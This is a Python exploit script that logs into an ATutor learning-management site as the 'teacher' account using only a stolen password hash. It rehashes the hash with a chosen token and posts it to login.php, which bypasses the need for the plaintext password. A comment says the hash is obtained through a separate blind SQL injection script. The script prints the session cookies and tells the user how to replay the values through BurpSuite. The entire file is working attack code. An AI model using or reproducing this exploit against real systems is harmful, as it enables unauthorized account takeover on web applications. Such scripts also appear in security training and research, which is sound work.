import sys
import requests
import hashlib

def gen_hash(pwd_hash, token):
    # Atutor/themes/simplified_desktop/login.tmpl.php
    pwd_token_hash = hashlib.sha1((pwd_hash + token).encode("utf-8"))
    
    return pwd_token_hash.hexdigest()
        
def login_by_hash(host, pwd_hash):
    
    protocol        = "http://"
    path            = "/ATutor/login.php"
    target          = "%s%s%s" % (protocol, host, path)
    token           = "emre"
    pwd_second_hash = gen_hash(pwd_hash, token)
    d = {
        "form_login": "teacher",
        "form_password_hidden" : pwd_second_hash,
        "token" : token,
        "submit": "Login"
    }
    
    sess = requests.Session()
    r = sess.post(target, data=d)
    
    res = r.text
    
    if "Create Course: My Start Page" in res or "My Courses: My Start Page" in res:
        print("[+] form_password_hidden: %s " % pwd_second_hash)
        print("[+] token: %s " % token)
        print("[+] Cookie: %s " % r.cookies.items()) # Due to prevention, connot login only with cookie
        print("[+] Authentication successful")
        print("[+] NOTE: Intercept a login request by BurpSuite and replace 'form_password_hidden' and add 'token' post parameters")
    else:
        print("[-] Authentication failure!")
    
    return sess

def main():
    if len(sys.argv) != 3:
        print("[!] usage: %s <target> <password_hash>" % sys.argv[0])
        print('[!] eg: python %s atutor.local 56b11a0603c7b7b8b4f06918e1bb5378ccd481cc' % sys.argv[0])
        sys.exit(-1)

    host = sys.argv[1]
    
    # pwd_hash is retrieved via `python searchFriendsBsqli.py atutor.local password_hash`
    pwd_hash = sys.argv[2]

    login_by_hash(host, pwd_hash)
    
if __name__ == "__main__":
    main()